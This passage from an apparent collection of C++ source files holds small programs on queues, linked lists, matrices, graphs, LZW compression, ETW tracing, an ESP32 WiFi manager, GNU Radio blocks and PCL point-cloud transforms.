1)\n\t\t\t{\n\t\t\t\tdequeueAll();\n\t\t\t\tcout << \"\\nCheck data of queue after dequeuing all nodes :\\n \";\n\t\t\t\tdisplay();\n\t\t\t}\n\t\t\telse {\n\t\t\t\tcout << \"Dequeue all is canceled\\n\";\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 4:\n\t\t\tcout << \"Enqueue Elements are:\\n\";\n\t\t\tdisplay();\n\t\t\tbreak;\n\t\tcase 5:\n\t\t\treturn;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tcout << \"Wrong Input Try Again\\n\";\n\t\t}\n\t\tcout << \"Do you want another opration\\n\";\n\t\tcout << \"Yes -> 1 \\n\";\n\t\tcout << \"NO -> any key \\n\";\n\t\tcin >> ao;\n\t} while (ao == 1);\n}\nint main()\n{\n\tapp();\n\treturn 0;\n}",
    "#include <fmt/core.h>\n#include <gnuradio-4.0/Graph.hpp>\n#include <gnuradio-4.0/Scheduler.hpp>\n#include <gnuradio-4.0/packet-modem/vector_sink.hpp>\n#include <gnuradio-4.0/packet-modem/vector_source.hpp>\n#include <pmtv/pmt.hpp>\n#include <boost/ut.hpp>\n#include <numeric>\n\nint main()\n{\n    using namespace boost::ut;\n\n    gr::Graph fg;\n\n    std::vector<int> v(100);\n    std::iota(v.begin(), v.end(), 0);\n\n    const std::vector<gr::Tag> tags = {\n        { 0, { { \"begin\", pmtv::pmt_null() } } },\n        { 10, { { \"param_a\", 3.1415 }, { \"param_b\", 12345U } } },\n        { 73, { { \"param_c\", std::vector<int>{ 1, 2, 3 } }, { \"param_d\", 0.0f } } },\n        { std::ssize(v) - 1, { { \"end\", pmtv::pmt_null() } } }\n    };\n\n    auto& source = fg.emplaceBlock<gr::packet_modem::VectorSource<int>>();\n    source.data = v;\n    source.tags = tags;\n    auto& sink = fg.emplaceBlock<gr::packet_modem::VectorSink<int>>();\n    expect(eq(gr::ConnectionResult::SUCCESS, fg.connect<\"out\">(source).to<\"in\">(sink)));\n\n    gr::scheduler::Simple sched{ std::move(fg) };\n    expect(sched.runAndWait().has_value());\n\n    const auto data = sink.data();\n    fmt::print(\"vector sink contains {} items\\n\", data.size());\n    fmt::print(\"vector sink items:\\n\");\n    for (const auto n : data) {\n        fmt::print(\"{} \", n);\n    }\n    fmt::print(\"\\n\");\n    fmt::print(\"vector sink tags:\\n\");\n    const auto sink_tags = sink.tags();\n    for (const auto& t : sink_tags) {\n        fmt::print(\"index = {}, map = {}\\n\", t.index, t.map);\n    }\n\n    return 0;\n}\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n#include <algorithm>\r\n#include <stdexcept>\r\n\r\nusing namespace std;\r\n// class Utilisateur  (user)\r\nclass User {\r\nprivate:\r\n    static int idU;\r\n    int userID;\r\n    string nom, prenom;\r\n    string username;\r\n    string password;\r\n    string departement;\r\npublic:\r\n/* Constructors */\r\n    User(){ userID = idU++; }\r\n    User(string n, string pre, string u, string p, string d):userID(idU++), nom(n), prenom(pre), username(u), password(p), departement(d){}\r\n    // getters\r\n    int getId()const { return userID; }\r\n    string getNom()const { return nom;}\r\n    string getPrenom()const{return prenom ;}\r\n    string getUsername()const { return username;}\r\n    string getDepartement()const {return  departement ;}\r\n    // setters \r\n    void setNom(string nom) { this->nom = nom;}\r\n    void setPrenom(string prenom) {this->prenom = prenom;}\r\n    void setUsername(string username) {this->username = username;}\r\n    void setPassword(string password) {this->password = password;}\r\n    void setDepartement(string departement) {this->departement = departement;}\r\n\r\n\r\n\r\n    bool authenticate(string u, string p) const {\r\n        return username == u && password == p;\r\n    }\r\n    friend ostream& operator<<(ostream& on, const User& u) {\r\n        on << \"-------------------------------\" << endl;\r\n        on << \"ID de l'utilisateur: \" << u.userID << endl;\r\n        on << \"Nom: \" << u.nom << endl;\r\n        on << \"Prenom: \" << u.prenom << endl;\r\n        on << \"Username: \" << u.username << endl;\r\n        on << \"Departement: \" << u.departement << endl;\r\n        return on;\r\n    }\r\n    friend istream& operator>>(istream& in, User& u){\r\n        cout << \"entrer le  nom de l'utilisateur\"<< endl;\r\n        in >> u.nom;\r\n        cout << \"entrer le prenom de l'utilisateur\"<<endl;\r\n        in >> u.prenom;\r\n        cout << \"entrer le Username de l'utilisateur\"<<endl;\r\n        in >> u.username;\r\n        cout << \"entrer le password de  l'utilisateur\"<<endl;\r\n        in >> u.password;\r\n        cout << \"entrer la departement de  l'utilisateur\"<<endl;\r\n        in >> u.departement;\r\n        return in;\r\n    }\r\n    void aff(){ cout<<\"\\n\\t[ID= \"<<userID<<\"][\"<<nom<<\":\"<<prenom<<\"]\"; }\r\n    ~User() {}\r\n};\r\nint User::idU = 1;\r\n\r\n// class matariel\r\nclass Material {\r\nprivate:\r\n    static  int idM;\r\n    int mId;\r\n    string nom,typeMat,reference,emplacement;\r\n    bool statue;\r\n    vector<User> usersAcce;\r\npublic:\r\n    Material(string n, string t, string r, string e,bool s): mId(idM++), nom(n), typeMat(t), reference(r), emplacement(e),statue(s){}\r\n    // getters est setters\r\n    int getId() const {return mId;}\r\n    const string& getNom() const {return nom;}\r\n    void setNom(const string& name) {nom = name;}\r\n    const string& getType() const {return typeMat;}\r\n    void setType(const string& type) {typeMat = type;}\r\n    const string& getReference() const {return reference;}\r\n    void setReference(const string& ref) {reference = ref;}\r\n    const string& getEmplacement() const {return emplacement;}\r\n    void setEmplacement(const string& place) {emplacement = place;}\r\n    bool isStatue() const {return statue;}\r\n    void setStatue(bool status) {statue = status;}\r\n\r\n    void usersAcceAff(){\r\n        if(!usersAcce.empty()){\r\n            for (auto u:usersAcce) {\r\n                u.aff();\r\n            }\r\n        } else{ cout<<\"*Aucun utilisateur*\";}\r\n    }\r\n    friend ostream& operator<<(ostream& on, const Material& m) {\r\n        on <<\"\\n\\n---------------------------\\n\";\r\n        on << \"ID de matariel: \" << m.mId << endl;\r\n        on << \"Nom: \" << m.nom << endl;\r\n        on << \"type: \" << m.typeMat << endl;\r\n        on << \"reference: \" << m.reference << endl;\r\n        on << \"emplacement: \" << m.emplacement << endl;\r\n        on << \"statut: \";m.statue?cout<<\" en service \"<<endl:cout<<\" Hors service \"<<endl;\r\n        return on;\r\n    }\r\n    friend istream& operator>>(istream& in, Material& m) {\r\n        cout <<\"\\n---------------------------\\n\";\r\n        cout << \"Entrer le nom du materiel : \";\r\n        in >> m.nom;\r\n        cout << \"Entrer le type du materiel : \";\r\n        in >> m.typeMat;\r\n        cout << \"Entrer la reference du materiel : \";\r\n        in >> m.reference;\r\n        cout << \"Entrer l'emplacement du materiel : \";\r\n        in >> m.emplacement;\r\n        cout << \"Le materiel est-il en service ? (1 pour oui, 0 pour non) : \";\r\n        in >> m.statue;\r\n        return in;\r\n    }\r\n    void aff(){\r\n        cout<<\"\\n\\t\\t[-\"<<mId<<\"-]-_-( \"<<nom<<\" )-_-( \"<<typeMat<<\" )\";\r\n    }\r\n    void affX(){\r\n        cout<<\"\\n\\t__________Matarial__________\";\r\n        cout << \"ID de matariel: \" << mId << endl;\r\n        cout << \"Nom: \" << nom << endl;\r\n        cout << \"type: \" << typeMat << endl;\r\n        cout << \"reference: \" << reference << endl;\r\n        cout << \"emplacement: \" << emplacement << endl;\r\n        cout << \"statut: \";statue?cout<<\" en service \"<<endl:cout<<\" Hors service \"<<endl;\r\n    }\r\n    void adduser(User u){\r\n        user",
    "#include <bitset>\n#include <conio.h>\n#include <iostream>\n#include <chrono>\n#include <thread>\n\n#include <windows.h> // Definitions required by TraceLoggingProvider.h\n#include <TraceLoggingProvider.h> // The C/C++ TraceLogging API\n\nusing namespace std;\n\nvoid EmitCaptureStateEvents(ULONGLONG match_any_keyword, ULONGLONG match_all_keyword);\n\n// Define a handle to a TraceLogging provider\nTRACELOGGING_DEFINE_PROVIDER(\n  g_hMyComponentProvider,\n  \"EtwCallbackSample\",\n  // {0205c222-cf97-5c11-9756-56a2cee02cb0}\n  (0x0205c222, 0xcf97, 0x5c11, 0x97, 0x56, 0x56, 0xa2, 0xce, 0xe0, 0x2c, 0xb0));\n\n// This callback is invoked by Windows every time the ETW tracing status is changed for this application.\nvoid WINAPI ETWEnableCallback(LPCGUID /* source_id */, ULONG is_enabled,\n  UCHAR level, ULONGLONG match_any_keyword,\n  ULONGLONG match_all_keyword,\n  PEVENT_FILTER_DESCRIPTOR filter_data,\n  PVOID /* callback_context */)\n{\n  cout\n    << \"is_enabled:\" << (void*)is_enabled\n    << \"; level:\" << (void*)level\n    << \"; match_any_keyword:\" << (void*)match_any_keyword\n    << \"; match_all_keyword:\" << (void*)match_all_keyword\n    << \"; filter_data:\" << (void*)filter_data\n    << endl\n  ;\n\n  if (is_enabled == 2)\n  {\n    auto t = thread(EmitCaptureStateEvents, match_any_keyword, match_all_keyword);\n    t.join();\n  }\n}\n\nvoid LoopUntilQ()\n{\n  cout << \"Type 'q' when you want to quit.\" << endl;\n\n  char c;\n  \n  while (true) {\n    c = _getch();\n    if (c == 'q') {\n      break;\n    }\n  }\n}\n\nint main()\n{\n  cout << \"Calling TraceLoggingRegisterEx.\" << endl;\n  TraceLoggingRegisterEx(g_hMyComponentProvider, ETWEnableCallback, nullptr);\n  cout << \"TraceLoggingRegisterEx returned.\" << endl << endl;\n\n  LoopUntilQ();\n\n  cout << endl << \"Calling TraceLoggingUnregister.\" << endl;\n  TraceLoggingUnregister(g_hMyComponentProvider);\n  cout << \"TraceLoggingUnregister returned.\" << endl;\n}\n\n\nvoid EmitCaptureStateEvents(ULONGLONG match_any_keyword, ULONGLONG match_all_keyword)\n{\n  cout\n    << \"Emitting capture state events for \"\n    << \"; match_any_keyword:\" << (void*)match_any_keyword\n    << \"; match_all_keyword:\" << (void*)match_all_keyword\n    << endl\n  ;\n\n  this_thread::sleep_for(chrono::milliseconds(10000));\n\n  TraceLoggingWrite(\n    g_hMyComponentProvider, \n    \"capturestate-event1\",\n    TraceLoggingLevel(1),\n    TraceLoggingKeyword(0x1)\n  );\n\n  TraceLoggingWrite(\n    g_hMyComponentProvider,\n    \"capturestate-event2\",\n    TraceLoggingLevel(1),\n    TraceLoggingKeyword(0x2)\n  );\n\n  TraceLoggingWrite(\n    g_hMyComponentProvider,\n    \"capturestate-event4\",\n    TraceLoggingLevel(1),\n    TraceLoggingKeyword(0x4)\n  );\n\n  TraceLoggingWrite(\n    g_hMyComponentProvider,\n    \"capturestate-event8\",\n    TraceLoggingLevel(1),\n    TraceLoggingKeyword(0x8)\n  );\n\n  TraceLoggingWrite(\n    g_hMyComponentProvider,\n    \"capturestate-event10\",\n    TraceLoggingLevel(1),\n    TraceLoggingKeyword(0x10)\n  );\n\n  TraceLoggingWrite(\n    g_hMyComponentProvider,\n    \"capturestate-event20\",\n    TraceLoggingLevel(1),\n    TraceLoggingKeyword(0x20)\n  );\n\n  cout\n    << \"Done emitting capture state events for \"\n    << \"; match_any_keyword:\" << (void*)match_any_keyword\n    << \"; match_all_keyword:\" << (void*)match_all_keyword\n    << endl\n  ;\n}",
    "#include <iostream>\n#include <string>\nusing namespace std;\n\nstruct Node\n{\n\tint noMhs;\n\tstring name;\n\tNode* next;\n\tNode* prev;\n};\nNode* START = NULL;\n\nvoid addNode() {\n\tNode* newNode = new Node();\n\tcout << \"\\nEnter the roll number of the student: \";\n\tcin >> newNode->noMhs;\n\tcout << \"\\nEnter the name of the student: \";\n\tcin >> newNode->name;\n\tif (START == NULL || newNode->noMhs <= START->noMhs) {\n\n\t\tif (START != NULL && newNode->noMhs == START->noMhs) {\n\t\t\tcout << \"\\033[31mDuplicate roll numbers not allowed\\033[0m\" << endl;\n\t\t\treturn;\n\t\t}\n\t\tnewNode->next = START;\n\t\tif (START != NULL) {\n\t\t\tSTART->prev = newNode;\n\t\t}\n\t\tnewNode->prev = NULL;\n\t\tSTART = newNode;\n\t}\n\telse {\n\t\tNode* current = START;\n\t\tNode* previous = NULL;\n\t\twhile (current != NULL && current->noMhs < newNode->noMhs)\n\t\t{\n\t\t\tprevious = current;\n\t\t\tcurrent = current->next;\n\t\t}\n\t\tnewNode->next = current;\n\t\tnewNode->prev = previous;\n\n\t\tif (current != NULL)\n\t\t{\n\t\t\tcurrent->prev = newNode;\n\t\t}\n\t\tif (previous != NULL)\n\t\t{\n\t\t\tprevious->next = newNode;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tSTART = newNode;\n\t\t}\n\t}\n}\n\nbool search(int rollNo, Node** previous, Node** current)\n{\n\t*previous = NULL;\n\t*current = START;\n\twhile (*current != NULL && (*current)->noMhs != rollNo)\n\t{\n\t\t*previous = *current;\n\t\t*current = (*current)->next;\n\t}\n\treturn (*current != NULL);\n}\n\nvoid deleteNode()\n{\n\tNode* previous, * current;\n\tint rollNo;\n\n\tcout << \"\\nEnter the roll number of the student whose record is to be deleted: \";\n\tcin >> rollNo;\n\n\tif (START == NULL)\n\t{\n\t\tcout << \"List is empty\" << endl;\n\t\treturn;\n\t}\n\n\tcurrent = START;\n\tprevious = NULL;\n\n\twhile (current != NULL && current->noMhs != rollNo)\n\t{\n\t\tprevious = current;\n\t\tcurrent = current->next;\n\t}\n\n\tif (current == NULL)\n\t{\n\t\tcout << \"\\033[31mThe record with roll number \" << rollNo << \" not found\\033[0m\" << endl;\n\t\treturn;\n\t}\n\tif (current == START)\n\t{\n\t\tSTART = START->next;\n\t\tif (START != NULL)\n\t\t{\n\t\t\tSTART->prev = NULL;\n\t\t}\n\t}\n\telse\n\t{\n\t\tprevious->next = current->next;\n\t\tif (current->next != NULL)\n\t\t{\n\t\t\tcurrent->next->prev = previous;\n\t\t}\n\t}\n\n\tdelete current;\n\tcout << \"\\x1b[32mRecord with roll number \" << rollNo << \" delete\\x1b[0m\" << endl;\n}\n\nbool listEmpty()\n{\n\treturn (START == NULL);\n}\n\nvoid traverse()\n{\n\tif (listEmpty())\n\t\tcout << \"\\nList is empty\" << endl;\n\telse\n\t{\n\t\tcout << \"\\nRecords in ascending order of roll number are:\" << endl;\n\t\tNode* currentNode = START;\n\t\twhile (currentNode != NULL)\n\t\t{\n\t\t\tcout << currentNode->noMhs << \" \" << currentNode->name << endl;\n\t\t\tcurrentNode = currentNode->next;\n\t\t}\n\t}\n}\n\nvoid revtraverse()\n{\n\tif (listEmpty())\n\t\tcout << \"\\nList is empty\" << endl;\n\telse\n\t{\n\t\tcout << \"\\nRecord in descending order of roll number are:\" << endl;\n\t\tNode* currentNode = START;\n\t\twhile (currentNode->next != NULL)\n\t\t\tcurrentNode = currentNode->next;\n\n\t\twhile (currentNode != NULL)\n\t\t{\n\t\t\tcout << currentNode->noMhs << \" \" << currentNode->name << endl;\n\t\t\tcurrentNode = currentNode->prev;\n\t\t}\n\t}\n}\n\nvoid searchData()\n{\n\tif (listEmpty() == true)\n\t{\n\t\tcout << \"\\nList is empty\" << endl;\n\t}\n\tNode* prev, * curr;\n\tprev = curr = NULL;\n\tcout << \"\\nEnter the roll number of the student whose record you want to search: \";\n\tint num;\n\tcin >> num;\n\tif (search(num, &prev, &curr) == false)\n\t\tcout << \"\\nRecord not found\" << endl;\n\telse\n\t{\n\t\tcout << \"\\nRecord found\" << endl;\n\t\tcout << \"\\nRoll number: \" << curr->noMhs << endl;\n\t\tcout << \"\\nName: \" << curr->name << endl;\n\t}\n}\n\nint main()\n{\n\twhile (true)\n\t{\n\t\ttry\n\t\t{\n\t\t\tcout << \"\\nMenu\" << endl;\n\t\t\tcout << \"1. Add a record to the list\" << endl;\n\t\t\tcout << \"2. Delete a record from the list\" << endl;\n\t\t\tcout << \"3. View all records in the ascending order of roll numbers\" << endl;\n\t\t\tcout << \"4. View all records in the descending order of roll numbers\" << endl;\n\t\t\tcout << \"5. Search for a record in the list\" << endl;\n\t\t\tcout << \"6.Exit\" << endl;\n\t\t\tcout << \"\\nEnter your choice (1-6): \";\n\t\t\tchar ch;\n\t\t\tcin >> ch;\n\n\t\t\tswitch (ch)\n\t\t\t{\n\t\t\tcase '1':\n\t\t\t\taddNode();\n\t\t\t\tbreak;\n\t\t\tcase '2':\n\t\t\t\tdeleteNode();\n\t\t\t\tbreak;\n\t\t\tcase '3':\n\t\t\t\ttraverse();\n\t\t\t\tbreak;\n\t\t\tcase '4':\n\t\t\t\trevtraverse();\n\t\t\t\tbreak;\n\t\t\tcase '5':\n\t\t\t\tsearchData();\n\t\t\t\tbreak;\n\t\t\tcase '6':\n\t\t\t\treturn 0;\n\t\t\tdefault:\n\t\t\t\tcout << \"\\nInvalid option\" << endl;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tcatch (exception& e)\n\t\t{\n\t\t\tcout << \"Chek for the values entered.\" << endl;\n\t\t}\n\t}\n}\n",
    "#include \"WifiManager.h\"\n#include <WiFi.h>\n#include <ESPmDNS.h>\n\nvoid on_wifi_event(WiFiEvent_t event) {\n\tswitch (event) {\n\t\tcase WiFiEvent_t::ARDUINO_EVENT_WIFI_STA_DISCONNECTED:\n\t\t\tSerial.println(\"Wi-fi disconnected. Enabling auto-reconnect\");\n\t\t\tWiFi.setAutoReconnect(true);\n\t\t\tbreak;\n\t\tdefault:\n      break;\n  }\n}\n\nvoid WifiManager::begin() {\n  WiFi.removeEvent(on_wifi_event);\n\n  WiFi.disconnect();\n  WiFi.setAutoConnect(false);\n  WiFi.setAutoReconnect(false);\n\n  _preferences.begin(\"wifi\", false);\n  String ssid = _preferences.getString(\"ssid\", \"\"); \n  String password = _preferences.getString(\"password\", \"\");\n  _preferences.end();\n\n  if (ssid != \"\" && password != \"\"){\n    WiFi.mode(WIFI_STA);\n    WiFi.begin(ssid.c_str(), password.c_str());\n    Serial.print(\"Connecting to WiFi ..\");\n    \n    byte retries = 0;\n    while (WiFi.status() != WL_CONNECTED && retries++ < 10) {\n      Serial.print('.');\n      delay(1000);\n    }\n\n    if(WiFi.status()== WL_CONNECTED) {\n      Serial.println(\"connected\");\n      Serial.print(\"   IP address: \");\n      Serial.println(WiFi.localIP());\n\n      WiFi.onEvent(on_wifi_event);\n\n      return;\n    }\n  }\n\n  WiFi.mode(WIFI_AP);\n  boolean result = WiFi.softAP(\"clock\", NULL);\n  if (result == true) {\n    Serial.println(\"AP created\");\n    Serial.print(\"   IP address: \");\n    Serial.println(WiFi.softAPIP());\n  }\n  else {\n    Serial.println(\"AP failed\");\n  }\n}\n\nvoid WifiManager::start_mdns(const char* host) {\n  if (!MDNS.begin(host)) {\n    Serial.println(\"Error setting up mDNS responder\");\n  }\n  Serial.println(\"mDNS responder started\");\n}\n\nvoid WifiManager::set_credentials(String ssid, String password) {\n  _preferences.begin(\"wifi\", false);\n  _preferences.putString(\"ssid\", ssid); \n  _preferences.putString(\"password\", password);\n  _preferences.end();\n\n  Serial.print(\"Stored ssid \");\n  Serial.println(ssid);\n}\n",
    "#include <iostream>\r\n#include <string>\r\n\r\nusing namespace std;\r\n\r\nstruct Estudiante {\r\n    int id;\r\n    string nombres;\r\n    string apellidos;\r\n    double notas[4];\r\n};\r\n\r\nvoid calcularPromedio(Estudiante* estudiante) {\r\n    double suma = 0;\r\n    for (int i = 0; i < 4; ++i) {\r\n        suma += estudiante->notas[i];\r\n    }\r\n    double promedio = suma / 4.0;\r\n    cout << \"El promedio de \" << estudiante->nombres << \" \" << estudiante->apellidos << \" es: \" << promedio << endl;\r\n    if (promedio > 60) {\r\n        cout << \"\u00a1Estudiante aprobado!\" << endl;\r\n    } else {\r\n        cout << \"Estudiante reprobado.\" << endl;\r\n    }\r\n}\r\n\r\nint main() {\r\n    int n;\r\n    cout << \"Ingrese la cantidad de estudiantes: \";\r\n    cin >> n;\r\n\r\n    Estudiante* estudiantes = new Estudiante[n];\r\n\r\n    for (int i = 0; i < n; ++i) {\r\n        cout << \"Ingrese el ID del estudiante \" << i+1 << \": \";\r\n        cin >> estudiantes[i].id;\r\n        cin.ignore(); // Limpiar el buffer del teclado\r\n        cout << \"Ingrese el nombre del estudiante \" << i+1 << \": \";\r\n        getline(cin, estudiantes[i].nombres);\r\n        cout << \"Ingrese el apellido del estudiante \" << i+1 << \": \";\r\n        getline(cin, estudiantes[i].apellidos);\r\n        cout << \"Ingrese las notas (separadas por espacio) del estudiante \" << i+1 << \": \";\r\n        for (int j = 0; j < 4; ++j) {\r\n            cin >> estudiantes[i].notas[j];\r\n        }\r\n    }\r\n\r\n    cout << \"\\nResultados:\\n\" << endl;\r\n\r\n    for (int i = 0; i < n; ++i) {\r\n        calcularPromedio(&estudiantes[i]);\r\n    }\r\n\r\n    delete[] estudiantes; // Liberar la memoria asignada al arreglo de estudiantes\r\n\r\n    return 0;\r\n}\r\n\r\n",
    "#include <iostream>\r\n#include <stack>\r\n#include <string>\r\nusing namespace std;\r\nbool isOperator(char ch) {\r\n    if (ch == '+' || ch == '-' || ch == '*' || ch == '/')\r\n        return true;\r\n    return false;\r\n}\r\nint performOperation(int a, int b, char op) {\r\n    switch (op) {\r\n        case '+':\r\n            return a + b;\r\n        case '-':\r\n            return a - b;\r\n        case '*':\r\n            return a * b;\r\n        case '/':\r\n            return a / b;\r\n    }\r\n    return 0;\r\n}\r\nint evaluatePostfix(string postfix) {\r\n    stack<int> st; \r\n  for (int i = 0; i < postfix.length(); i++) {\r\n        char ch = postfix[i];\r\n        if (isalnum(ch)) {\r\n            st.push(ch - '0');\r\n        }\r\n        else if (isOperator(ch)) {\r\n            int b = st.top();\r\n            st.pop();\r\n            int a = st.top();\r\n            st.pop();\r\n            st.push(performOperation(a, b, ch));\r\n        }\r\n    }\r\n\r\n    return st.top();\r\n}\r\n\r\nint main() {\r\n    string postfix = \"23+4*5-\";\r\n    cout << \"Postfix: \" << postfix << endl;\r\n    cout << \"Result: \" << evaluatePostfix(postfix) << endl;\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\nusing namespace std;\n\nint main() {\n    int a[10][10], transpose[10][10], row, column, i, j;\n\n    cout << \"Enter rows and columns of matrix: \";\n    cin >> row >> column;\n\n    cout << \"\\nEnter elements of matrix: \" << endl;\n\n    // Storing matrix elements\n    for (int i = 0; i < row; ++i) {\n        for (int j = 0; j < column; ++j) {\n            cout << \"Enter element a\" << i + 1 << j + 1 << \": \";\n            cin >> a[i][j];\n        }\n    }\n\n    // Printing the a matrix\n    cout << \"\\nEntered Matrix: \" << endl;\n    for (int i = 0; i < row; ++i) {\n        for (int j = 0; j < column; ++j) {\n            cout << \" \" << a[i][j];\n            if (j == column - 1)\n                cout << endl << endl;\n        }\n    }\n\n    // Computing transpose of the matrix\n    for (int i = 0; i < row; ++i)\n        for (int j = 0; j < column; ++j) {\n            transpose[j][i] = a[i][j];\n        }\n\n    // Printing the transpose\n    cout << \"\\nTranspose of Matrix: \" << endl;\n    for (int i = 0; i < column; ++i)\n        for (int j = 0; j < row; ++j) {\n            cout << \" \" << transpose[i][j];\n            if (j == row - 1)\n                cout << endl << endl;\n        }\n\n    return 0;\n}",
    "\n\n#include <iostream>\n#include <vector>\n#include <unordered_map>\n\nusing namespace std;\n\nclass Graph {\nprivate:\n    unordered_map<int, vector<int>> adjacency_list;\n\npublic:\n    void addVertex(int vertex) {\n        // Add vertex if not already present\n        if (adjacency_list.find(vertex) == adjacency_list.end()) {\n            adjacency_list[vertex] = vector<int>();\n        }\n    }\n\n    void addEdge(int vertex1, int vertex2) {\n        // Assuming an undirected graph\n        adjacency_list[vertex1].push_back(vertex2);\n        adjacency_list[vertex2].push_back(vertex1);\n    }\n\n    void printGraph() {\n        for (const auto& pair : adjacency_list) {\n            cout << pair.first << \" -> \";\n            for (int neighbor : pair.second) {\n                cout << neighbor << \" \";\n            }\n            cout << endl;\n        }\n    }\n};\n\nint main() {\n    Graph graph;\n    graph.addVertex(1);\n    graph.addVertex(2);\n    graph.addVertex(3);\n    graph.addEdge(1, 2);\n    graph.addEdge(2, 3);\n\n    graph.printGraph();\n\n    return 0;\n}\n",
    "#include <iostream>\n#include <stack>\n#include <string>\n\nbool StatementBalancedCheck(std::string statement) {\n    std::stack<char> ParenthesesCheck;\n\n    for (char parentheses : statement) {\n        if (parentheses == '(') {\n        // If an open parentheses is found, place it in the stack\n            ParenthesesCheck.push(parentheses);\n        }\n        else if (parentheses == ')') {\n            if (ParenthesesCheck.empty()) {\n                return false;\n        // If a close parentheses is found without an open parentheses in the stack, return that the statement is not balanced.\n            }\n            ParenthesesCheck.pop();\n        // If a close parentheses is found with an open parentheses in the stack, pop the open parentheses from the stack.\n        }\n    }\n    return ParenthesesCheck.empty();\n}\n\nint main() {\n    std::string statement;\n    std::cout << \"Enter a statement to balance: \";\n    std::cin >> statement;\n\n    //Requests a string to check for balanced parentheses.\n\n    if (StatementBalancedCheck(statement)) { // Checks if the provided sentence/string has a balanced amount of parentheses, then returns an output if it is or is not.\n        std::cout << \"Statement is balanced\\n\";\n    }\n    else {\n        std::cout << \"Statement is not balanced\\n\";\n    }\n}",
    "#include <iostream>\n#include <vector>\n#include <unordered_map>\n\nusing namespace std;\n\nvector<int> comprimir_lzw(const string& entrada) {\n\tvector<int> comprimido;\n\tunordered_map<string, int> diccionario;\n\n\tfor (int i = 0; i < 256; i++) {\n\t\tstring caracter(1, char(i));\n\t\tdiccionario[caracter] = i;\n\t}\n\n\tstring actual;\n\tfor (char caracter: entrada) {\n\t\tstring temporal = actual + caracter;\n\t\tif (diccionario.find(temporal) != diccionario.end()) {\n\t\t\tactual = temporal;\n\t\t}\n\t\telse {\n\t\t\tcomprimido.push_back(diccionario[actual]);\n\t\t\tdiccionario[temporal] = diccionario.size();\n\t\t\tactual = string(1, caracter);\n\t\t}\n\t}\n\n\tif (!actual.empty()) {\n\t\tcomprimido.push_back(diccionario[actual]);\n\t}\n\n\treturn comprimido;\n}\n\n\nstring descomprimir_lzw(const vector<int>& comprimido) {\n\tunordered_map<int, string> diccionario;\n\tstring descomprimido;\n\n\tfor (int i = 0; i < 256; i++) {\n\t\tstring caracter(1, char(i));\n\t\tdiccionario[i] = caracter;\n\t}\n\n\tstring previo(1, char(comprimido[0]));\n\tstring actual;\n\tactual += previo;\n\tdescomprimido += previo;\n\n\tfor (size_t i = 1; i < comprimido.size(); i++) {\n\t\tint valor = comprimido[i];\n\n\t\tif (diccionario.find(valor) == diccionario.end()) {\n\t\t\tactual = previo + previo[0];\n\t\t}\n\t\telse {\n\t\t\tactual = diccionario[valor];\n\t\t}\n\n\t\tdescomprimido += actual;\n\t\tdiccionario[diccionario.size()] = previo + actual[0];\n\t\tprevio = actual;\n\t}\n\n\treturn descomprimido;\n}",
    "#include <iostream>\n\n#include <pcl/io/pcd_io.h>\n#include <pcl/io/ply_io.h>\n#include <pcl/point_cloud.h>\n#include <pcl/console/parse.h>\n#include <pcl/common/transforms.h>\n#include <pcl/visualization/pcl_visualizer.h>\n\n// This function displays the help\nvoid\nshowHelp(char* program_name)\n{\n    std::cout << std::endl;\n    std::cout << \"Usage: \" << program_name << \" cloud_filename.[pcd|ply]\" << std::endl;\n    std::cout << \"-h:  Show this help.\" << std::endl;\n}\n\n// This is the main function\nint\nmain(int argc, char** argv)\n{\n\n    // Show help\n    if (pcl::console::find_switch(argc, argv, \"-h\") || pcl::console::find_switch(argc, argv, \"--help\")) {\n        showHelp(argv[0]);\n        return 0;\n    }\n\n    // Fetch point cloud filename in arguments | Works with PCD and PLY files\n    std::vector<int> filenames;\n    bool file_is_pcd = false;\n\n    filenames = pcl::console::parse_file_extension_argument(argc, argv, \".ply\");\n\n    if (filenames.size() != 1) {\n        filenames = pcl::console::parse_file_extension_argument(argc, argv, \".pcd\");\n\n        if (filenames.size() != 1) {\n            showHelp(argv[0]);\n            return -1;\n        }\n        else {\n            file_is_pcd = true;\n        }\n    }\n\n    // Load file | Works with PCD and PLY files\n    pcl::PointCloud<pcl::PointXYZ>::Ptr source_cloud(new pcl::PointCloud<pcl::PointXYZ>());\n\n    if (file_is_pcd) {\n        if (pcl::io::loadPCDFile(argv[filenames[0]], *source_cloud) < 0) {\n            std::cout << \"Error loading point cloud \" << argv[filenames[0]] << std::endl << std::endl;\n            showHelp(argv[0]);\n            return -1;\n        }\n    }\n    else {\n        if (pcl::io::loadPLYFile(argv[filenames[0]], *source_cloud) < 0) {\n            std::cout << \"Error loading point cloud \" << argv[filenames[0]] << std::endl << std::endl;\n            showHelp(argv[0]);\n            return -1;\n        }\n    }\n\n    /* Reminder: how transformation matrices work :\n\n             |-------> This column is the translation\n      | 1 0 0 x |  \\\n      | 0 1 0 y |   }-> The identity 3x3 matrix (no rotation) on the left\n      | 0 0 1 z |  /\n      | 0 0 0 1 |    -> We do not use this line (and it has to stay 0,0,0,1)\n\n      METHOD #1: Using a Matrix4f\n      This is the \"manual\" method, perfect to understand but error prone !\n    */\n    Eigen::Matrix4f transform_1 = Eigen::Matrix4f::Identity();\n\n    // Define a rotation matrix (see https://en.wikipedia.org/wiki/Rotation_matrix)\n    float theta = M_PI / 4; // The angle of rotation in radians\n    transform_1(0, 0) = std::cos(theta);\n    transform_1(0, 1) = -sin(theta);\n    transform_1(1, 0) = sin(theta);\n    transform_1(1, 1) = std::cos(theta);\n    //    (row, column)\n\n    // Define a translation of 2.5 meters on the x axis.\n    transform_1(0, 3) = 2.5;\n\n    // Print the transformation\n    printf(\"Method #1: using a Matrix4f\\n\");\n    std::cout << transform_1 << std::endl;\n\n    /*  METHOD #2: Using a Affine3f\n      This method is easier and less error prone\n    */\n    Eigen::Affine3f transform_2 = Eigen::Affine3f::Identity();\n\n    // Define a translation of 2.5 meters on the x axis.\n    transform_2.translation() << 2.5, 0.0, 0.0;\n\n    // The same rotation matrix as before; theta radians around Z axis\n    transform_2.rotate(Eigen::AngleAxisf(theta, Eigen::Vector3f::UnitZ()));\n\n    // Print the transformation\n    printf(\"\\nMethod #2: using an Affine3f\\n\");\n    std::cout << transform_2.matrix() << std::endl;\n\n    // Executing the transformation\n    